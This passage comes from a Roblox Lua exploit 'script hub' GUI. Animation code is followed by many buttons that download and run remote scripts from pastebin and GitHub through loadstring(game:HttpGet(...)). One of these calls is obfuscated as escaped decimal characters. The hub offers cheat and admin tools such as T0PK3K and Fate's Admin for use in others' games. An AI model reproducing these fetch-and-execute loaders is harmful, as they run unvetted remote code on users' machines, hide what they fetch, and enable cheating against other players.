			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
	elseif TORSOVELOCITY > 1 and HITFLOOR ~= nil then
		ANIM = "Walk"
		if PLAYANIMS == true then
			if Humanoid.WalkSpeed <= 17 then
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
			else
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(35), RAD(0), RAD(5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-25 - 1 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(-5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(35), RAD(0)) * ANGLES(RAD(35+20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(-35), RAD(0)) * ANGLES(RAD(35-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 1 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5)), 2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5)), 2 / Animation_Speed)
			end
		end
	end
	unanchor()
	if Rooted == false then
		Disable_Jump = false
		Humanoid.WalkSpeed = Speed
	elseif Rooted == true then
		Disable_Jump = true
		Humanoid.WalkSpeed = 0
	end
	if Head:FindFirstChild("face") then
		Head.face:remove()
	elseif Head:FindFirstChildOfClass("Sound") then
		Head:FindFirstChildOfClass("Sound"):remove()
	end
	Humanoid.Health = Humanoid.Health + 1
end

--//=================================\\
--\\=================================//





--//====================================================\\--
--||			  		 END OF SCRIPT
--\\====================================================//--
end)
TextButton_6.Parent = Main
TextButton_6.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0.0308483411, 0, 0.429824591, 0)
TextButton_6.Size = UDim2.new(0, 113, 0, 32)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "Custom Hitbox"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\84\117\76\56\53\57\57\77\39\41\41\40\41\10")()
end)
TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(158, 255, 212)
TextButton_7.BorderSizePixel = 5
TextButton_7.Position = UDim2.new(0.0308483411, 0, 0.661519587, 0)
TextButton_7.Size = UDim2.new(0, 365, 0, 32)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "Invisible GUI"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end)
TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 174, 245)
TextLabel_2.BorderColor3 = Color3.fromRGB(64, 101, 127)
TextLabel_2.BorderSizePixel = 2
TextLabel_2.Position = UDim2.new(0, 0, 0.851239681, 0)
TextLabel_2.Size = UDim2.new(0, 389, 0, 36)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Made by ItzzJoshua_ credits to the owner of these scripts"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 36.000
TextLabel_2.TextStrokeColor3 = Color3.fromRGB(147, 60, 171)
TextLabel_2.TextWrapped = true
end)

Section:NewButton("RemX Gui", "Old. But Op", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Henry887/RemX-Script-Hub/main/main.lua'),true))()
end)

Section:NewButton("Heart Ui", "Old But Op", function()
   loadstring(game:GetObjects("rbxassetid://1313915586")[1].Source)()
end)

Section:NewButton("TopK3K Gui", "Old but Op", function()
-- loadstring(game:HttpGet(""))()

--{ Instances: }--

local TKR = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Topbar = Instance.new("Frame")
local Exit = Instance.new("TextButton")
local Controllers = Instance.new("Frame")
local Hide = Instance.new("TextButton")
local DisabledLabel = Instance.new("TextLabel")
local Holder = Instance.new("Frame")
local Home = Instance.new("Frame")
local Welcome = Instance.new("TextLabel")
local Container = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local TextLabel_9 = Instance.new("TextLabel")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")
local Scripts = Instance.new("Frame")
local Container_3 = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local Script = Instance.new("TextButton")
local Script_2 = Instance.new("TextButton")
local Script_3 = Instance.new("TextButton")
local Script_4 = Instance.new("TextButton")
local Script_5 = Instance.new("TextButton")
local Script_6 = Instance.new("TextButton")
local Script_7 = Instance.new("TextButton")
local Script_8 = Instance.new("TextButton")
local Script_9 = Instance.new("TextButton")
local Script_10 = Instance.new("TextButton")
local Script_11 = Instance.new("TextButton")
local Script_12 = Instance.new("TextButton")
local Script_13 = Instance.new("TextButton")
local Script_14 = Instance.new("TextButton")
local Script_15 = Instance.new("TextButton")
local Script_16 = Instance.new("TextButton")
local Script_17 = Instance.new("TextButton")
local Script_18 = Instance.new("TextButton")
local Info = Instance.new("Frame")
local Container_4 = Instance.new("ScrollingFrame")
local TextLabel_12 = Instance.new("TextLabel")
local Settings = Instance.new("Frame")
local Container_5 = Instance.new("ScrollingFrame")
local TextLabel_13 = Instance.new("TextLabel")
local TextLabel_14 = Instance.new("TextLabel")
local TextLabel_15 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local Navigation = Instance.new("Frame")
local Topbar_2 = Instance.new("Frame")
local Scroll = Instance.new("ScrollingFrame")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_29 = Instance.new("TextButton")
local TextBox_2 = Instance.new("TextBox")
local TextBox_3 = Instance.new("TextBox")
local TextBox_4 = Instance.new("TextBox")
local DisabledCommand = Instance.new("TextBox")
local Label = Instance.new("TextLabel")

--{ Properties: }--

TKR.Name = "TKR"
TKR.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
TKR.ResetOnSpawn = false

---> Property of aWx5 <---


local lpr = game.Players.LocalPlayer

--{ Text Stuff: }--

local name = game.Players.LocalPlayer.DisplayName
local place = game.PlaceId
local ping = "-"
local filteringenabled = game.Workspace.FilteringEnabled

--{ Topbar Buttons: }--

local exitdirectory = game.Players.LocalPlayer.PlayerGui.TKR
local closed = UDim2.new(0, 470,0, 30)
local winState = 0


Main.Name = "Main"
Main.Parent = TKR
Main.Active = true
Main.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Draggable = true
Main.Position = UDim2.new(0, 418, 0, 40)
Main.Selectable = true
Main.Size = UDim2.new(0, 470, 0, 395)

Topbar.Name = "Topbar"
Topbar.Parent = Main
Topbar.BackgroundColor3 = Color3.fromRGB(60, 119, 191)
Topbar.BorderSizePixel = 0
Topbar.Position = UDim2.new(0, 150, 0, 0)
Topbar.Size = UDim2.new(0, 320, 0, 30)

Controllers.Name = "Controllers"
Controllers.Parent = Topbar
Controllers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Controllers.BackgroundTransparency = 1.000
Controllers.Position = UDim2.new(1, -128, 0, 3)
Controllers.Size = UDim2.new(0, 125, 1, -6)

Exit.Name = "Exit"
Exit.Parent = Controllers
Exit.BackgroundColor3 = Color3.fromRGB(141, 27, 27)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(1, -24, 0, 0)
Exit.Size = UDim2.new(0, 24, 0, 24)
Exit.AutoButtonColor = false
Exit.Font = Enum.Font.SourceSans
Exit.Text = ""
Exit.TextSize = 14.000
Exit.MouseButton1Click:Connect(function()
	exitdirectory:Destroy()
end)

Hide.Name = "Hide"
Hide.Parent = Controllers
Hide.BackgroundColor3 = Color3.fromRGB(199, 89, 0)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(1, -50, 0, 0)
Hide.Size = UDim2.new(0, 24, 0, 24)
Hide.AutoButtonColor = false
Hide.Font = Enum.Font.SourceSans
Hide.Text = ""
Hide.TextSize = 14.000
Hide.MouseButton1Click:Connect(function()
	if winState == 0 then
		winState = 1
		Main:TweenSize(UDim2.new(0, 470, 0, 30), 'Out', 'Quad', 0.3, true)
	else
		winState = 0
		Main:TweenSize(UDim2.new(0, 470, 0, 395), 'In', 'Quad', 0.3, true)
	end
	
end)

DisabledLabel.Name = "DisabledLabel"
DisabledLabel.Parent = Controllers
DisabledLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DisabledLabel.BackgroundTransparency = 1.000
DisabledLabel.Size = UDim2.new(0, 65, 1, 0)
DisabledLabel.Visible = false
DisabledLabel.Font = Enum.Font.SourceSans
DisabledLabel.Text = "?"
DisabledLabel.TextColor3 = Color3.fromRGB(13, 105, 172)
DisabledLabel.TextSize = 16.000
DisabledLabel.TextStrokeTransparency = 0.700
DisabledLabel.TextXAlignment = Enum.TextXAlignment.Right

Holder.Name = "Holder"
Holder.Parent = Main
Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Holder.BackgroundTransparency = 1.000
Holder.Position = UDim2.new(0, 150, 0, 30)
Holder.Size = UDim2.new(0, 320, 0, 365)

Home.Name = "Home"
Home.Parent = Holder
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1.000
Home.Size = UDim2.new(1, 0, 1, 0)

Welcome.Name = "Welcome"
Welcome.Parent = Home
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0, 15, 0, 0)
Welcome.Selectable = true
Welcome.Size = UDim2.new(1, -30, 0, 40)
Welcome.Font = Enum.Font.SourceSansBold
Welcome.Text = "Welcome, "..tostring(name)
Welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
Welcome.TextSize = 34.000
Welcome.TextStrokeTransparency = 0.500
Welcome.TextXAlignment = Enum.TextXAlignment.Left

Container.Name = "Container"
Container.Parent = Home
Container.BackgroundColor3 = Color3.fromRGB(32, 66, 190)
Container.BorderColor3 = Color3.fromRGB(45, 72, 200)
Container.Position = UDim2.new(0, 15, 0, 41)
Container.Size = UDim2.new(1, -30, 0.145205483, 250)

TextLabel.Parent = Container
TextLabel.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 6, 0, 6)
TextLabel.Size = UDim2.new(1, -12, 0, 20)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "T0PK3K REMAKE FE EDITION"
TextLabel.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Container
TextLabel_2.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 6, 0, 29)
TextLabel_2.Size = UDim2.new(1, -12, 0, 20)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Patch version 1.0"
TextLabel_2.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = Container
TextLabel_3.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0, 6, 0, 270)
TextLabel_3.Size = UDim2.new(1, -12, 0, 20)
TextLabel_3.Visible = false
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "?"
TextLabel_3.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_3.TextSize = 14.000

TextLabel_4.Parent = Container
TextLabel_4.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0, 6, 0, 53)
TextLabel_4.Size = UDim2.new(1, -12, 0, 20)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_4.TextSize = 14.000

TextLabel_5.Parent = Container
TextLabel_5.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0, 6, 0, 75)
TextLabel_5.Size = UDim2.new(1, -12, 0, 20)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Server Size: "
TextLabel_5.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_5.TextSize = 14.000

TextLabel_6.Parent = Container
TextLabel_6.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0, 6, 0, 98)
TextLabel_6.Size = UDim2.new(1, -12, 0, 20)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "FilteringEnabled: "..tostring(filteringenabled)
TextLabel_6.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_6.TextSize = 14.000

TextLabel_7.Parent = Container
TextLabel_7.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_7.BorderSizePixel = 0
TextLabel_7.Position = UDim2.new(0, 6, 0, 124)
TextLabel_7.Size = UDim2.new(1, -12, 0, 20)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "PlaceId: "..tostring(place)
TextLabel_7.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_7.TextSize = 14.000

TextLabel_8.Parent = Container
TextLabel_8.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(0, 6, 0, 150)
TextLabel_8.Size = UDim2.new(1, -12, 0, 20)
TextLabel_8.Font = Enum.Font.SourceSans
TextLabel_8.Text = "FPS: "
TextLabel_8.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_8.TextSize = 14.000

TextLabel_9.Parent = Container
TextLabel_9.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_9.BorderSizePixel = 0
TextLabel_9.Position = UDim2.new(0, 6, 0, 176)
TextLabel_9.Size = UDim2.new(1, -12, 0, 20)
TextLabel_9.Font = Enum.Font.SourceSans
TextLabel_9.Text = "?: "..tostring(ping)
TextLabel_9.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_9.TextSize = 14.000

TextLabel_10.Parent = Container
TextLabel_10.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_10.BorderSizePixel = 0
TextLabel_10.Position = UDim2.new(0, 6, 0, 203)
TextLabel_10.Size = UDim2.new(1, -12, 0, 20)
TextLabel_10.Font = Enum.Font.SourceSans
TextLabel_10.Text = "Join our discord! discord.gg/z6Ggtqh5W8"
TextLabel_10.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_10.TextSize = 14.000

TextLabel_11.Parent = Container
TextLabel_11.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextLabel_11.BorderSizePixel = 0
TextLabel_11.Position = UDim2.new(0, 6, 0, 242)
TextLabel_11.Size = UDim2.new(1, -12, 0, 20)
TextLabel_11.Visible = false
TextLabel_11.Font = Enum.Font.SourceSans
TextLabel_11.Text = "?"
TextLabel_11.TextColor3 = Color3.fromRGB(199, 199, 199)
TextLabel_11.TextSize = 14.000

Scripts.Name = "Scripts"
Scripts.Parent = Holder
Scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scripts.BackgroundTransparency = 1.000
Scripts.Size = UDim2.new(1, 0, 1, 0)
Scripts.Visible = false

Container_3.Name = "Container"
Container_3.Parent = Scripts
Container_3.Active = true
Container_3.BackgroundColor3 = Color3.fromRGB(45, 72, 200)
Container_3.BorderColor3 = Color3.fromRGB(32, 66, 190)
Container_3.Position = UDim2.new(0, 15, 0, 10)
Container_3.Size = UDim2.new(1, -30, 0, 320)
Container_3.BottomImage = "rbxassetid://368504177"
Container_3.CanvasSize = UDim2.new(0, 0, 0, 540) -- 818
Container_3.MidImage = "rbxassetid://368504177"
Container_3.ScrollBarThickness = 5
Container_3.TopImage = "rbxassetid://368504177"

TextBox.Parent = Container_3
TextBox.BackgroundColor3 = Color3.fromRGB(51, 76, 209)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 6, 0, 6)
TextBox.Size = UDim2.new(1, -17, 0, 20)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(199, 199, 199)
TextBox.TextSize = 14.000

--{ Searcbar: }--

local scroll = exitdirectory.Main.Holder.Scripts.Container
local searchbar = scroll.TextBox

searchbar.Changed:Connect(function()
	local text = searchbar.Text:lower()
	if text ~= "" then
		local buttons = scroll:GetDescendants()
		for _, button in pairs(buttons) do
			if button:IsA("TextButton") then
				local buttonText = button.Text:lower()
				if string.find(buttonText, text) then
					button.Visible = true
					--button.Position = UDim2.new(0, 6,0, 29)
				else
					button.Visible = false
				end
			end
		end
	else
		local buttons = scroll:GetDescendants()
		for _, button in pairs(buttons) do
			if button:IsA("TextButton") then
				button.Visible = true
			end
		end
	end
end)

Script.Name = "Script"
Script.Parent = Container_3
Script.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script.BorderSizePixel = 0
Script.Position = UDim2.new(0, 6, 0, 29)
Script.Size = UDim2.new(1, -16, 0, 25)
Script.Font = Enum.Font.SourceSans
Script.Text = "Adonis"
Script.TextColor3 = Color3.fromRGB(199, 199, 199)
Script.TextSize = 14.000
Script.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Adonis.txt", true))()
end)

Script_2.Name = "Script"
Script_2.Parent = Container_3
Script_2.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_2.BorderSizePixel = 0
Script_2.Position = UDim2.new(0, 6, 0, 57)
Script_2.Size = UDim2.new(1, -16, 0, 25)
Script_2.Font = Enum.Font.SourceSans
Script_2.Text = "Fiery"
Script_2.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_2.TextSize = 14.000
Script_2.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Fiery.txt"))()
end)

Script_3.Name = "Script"
Script_3.Parent = Container_3
Script_3.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_3.BorderSizePixel = 0
Script_3.Position = UDim2.new(0, 6, 0, 85)
Script_3.Size = UDim2.new(1, -16, 0, 25)
Script_3.Font = Enum.Font.SourceSans
Script_3.Text = "Flash"
Script_3.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_3.TextSize = 14.000
Script_3.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/flash.txt"))()
end)

Script_4.Name = "Script"
Script_4.Parent = Container_3
Script_4.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_4.BorderSizePixel = 0
Script_4.Position = UDim2.new(0, 6, 0, 113)
Script_4.Size = UDim2.new(1, -16, 0, 25)
Script_4.Font = Enum.Font.SourceSans
Script_4.Text = "Grapple"
Script_4.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_4.TextSize = 14.000
Script_4.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Grapple.txt"))()
end)

Script_5.Name = "Script"
Script_5.Parent = Container_3
Script_5.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_5.BorderSizePixel = 0
Script_5.Position = UDim2.new(0, 6, 0, 141)
Script_5.Size = UDim2.new(1, -16, 0, 25)
Script_5.Font = Enum.Font.SourceSans
Script_5.Text = "Gravity"
Script_5.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_5.TextSize = 14.000
Script_5.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Gravity.txt"))()
end)

Script_6.Name = "Script"
Script_6.Parent = Container_3
Script_6.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_6.BorderSizePixel = 0
Script_6.Position = UDim2.new(0, 6, 0, 169)
Script_6.Size = UDim2.new(1, -16, 0, 25)
Script_6.Font = Enum.Font.SourceSans
Script_6.Text = "Homebrew"
Script_6.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_6.TextSize = 14.000
Script_6.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Homebrew.txt"))()
end)

Script_7.Name = "Script"
Script_7.Parent = Container_3
Script_7.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_7.BorderSizePixel = 0
Script_7.Position = UDim2.new(0, 6, 0, 197)
Script_7.Size = UDim2.new(1, -16, 0, 25)
Script_7.Font = Enum.Font.SourceSans
Script_7.Text = "Parkour"
Script_7.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_7.TextSize = 14.000
Script_7.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Parkour%20Updated.txt"))()
end)

Script_8.Name = "Script"
Script_8.Parent = Container_3
Script_8.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_8.BorderSizePixel = 0
Script_8.Position = UDim2.new(0, 6, 0, 225)
Script_8.Size = UDim2.new(1, -16, 0, 25)
Script_8.Font = Enum.Font.SourceSans
Script_8.Text = "Selexity"
Script_8.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_8.TextSize = 14.000
Script_8.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Selexity.txt"))()
end)

Script_9.Name = "Script"
Script_9.Parent = Container_3
Script_9.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_9.BorderSizePixel = 0
Script_9.Position = UDim2.new(0, 6, 0, 253)
Script_9.Size = UDim2.new(1, -16, 0, 25)
Script_9.Font = Enum.Font.SourceSans
Script_9.Text = "Typical Hub"
Script_9.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_9.TextSize = 14.000
Script_9.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Typical%20Hub.txt"))()
end)

Script_10.Name = "Script"
Script_10.Parent = Container_3
Script_10.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_10.BorderSizePixel = 0
Script_10.Position = UDim2.new(0, 6, 0, 281)
Script_10.Size = UDim2.new(1, -16, 0, 25)
Script_10.Font = Enum.Font.SourceSans
Script_10.Text = "FE Skateboard"
Script_10.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_10.TextSize = 14.000
Script_10.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/fe_skate.txt"))()
end)

Script_11.Name = "Script"
Script_11.Parent = Container_3
Script_11.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_11.BorderSizePixel = 0
Script_11.Position = UDim2.new(0, 6, 0, 309)
Script_11.Size = UDim2.new(1, -16, 0, 25)
Script_11.Font = Enum.Font.SourceSans
Script_11.Text = "Flu Gui"
Script_11.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_11.TextSize = 14.000
Script_11.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/FluGUI.txt"))()
end)

Script_12.Name = "Script"
Script_12.Parent = Container_3
Script_12.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_12.BorderSizePixel = 0
Script_12.Position = UDim2.new(0, 6, 0, 337)
Script_12.Size = UDim2.new(1, -16, 0, 25)
Script_12.Font = Enum.Font.SourceSans
Script_12.Text = "Fate's Admin"
Script_12.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_12.TextSize = 14.000
Script_12.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Fate.txt"))()
end)

Script_13.Name = "Script"
Script_13.Parent = Container_3
Script_13.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_13.BorderSizePixel = 0
Script_13.Position = UDim2.new(0, 6, 0, 365)
Script_13.Size = UDim2.new(1, -16, 0, 25)
Script_13.Font = Enum.Font.SourceSans
Script_13.Text = "Aspect Hub"
Script_13.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_13.TextSize = 14.000
Script_13.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Aspect%20Hub.txt"))()
end)

Script_14.Name = "Script"
Script_14.Parent = Container_3
Script_14.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_14.BorderSizePixel = 0
Script_14.Position = UDim2.new(0, 6, 0, 393)
Script_14.Size = UDim2.new(1, -16, 0, 25)
Script_14.Font = Enum.Font.SourceSans
Script_14.Text = "Selexity Reborn"
Script_14.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_14.TextSize = 14.000
Script_14.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/Selexity%20Reborn.txt"))()
end)

Script_15.Name = "Script"
Script_15.Parent = Container_3
Script_15.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_15.BorderSizePixel = 0
Script_15.Position = UDim2.new(0, 6, 0, 421)
Script_15.Size = UDim2.new(1, -16, 0, 25)
Script_15.Font = Enum.Font.SourceSans
Script_15.Text = "UTG Reborn"
Script_15.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_15.TextSize = 14.000
Script_15.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/UTG%20REBORN.txt"))()
end)

Script_16.Name = "Script"
Script_16.Parent = Container_3
Script_16.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
Script_16.BorderSizePixel = 0
Script_16.Position = UDim2.new(0, 6, 0, 449)
Script_16.Size = UDim2.new(1, -16, 0, 25)
Script_16.Font = Enum.Font.SourceSans
Script_16.Text = "T0PK3K"
Script_16.TextColor3 = Color3.fromRGB(199, 199, 199)
Script_16.TextSize = 14.000
Script_16.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/T0PK3K-REMAKE/scripts/TOPK3K.txt"))()
end)

Script_17.Name = "Script"
Script_17.Parent = Container_3
Script_17.BackgroundColor3 = Color3.fromRGB(71, 106, 197)
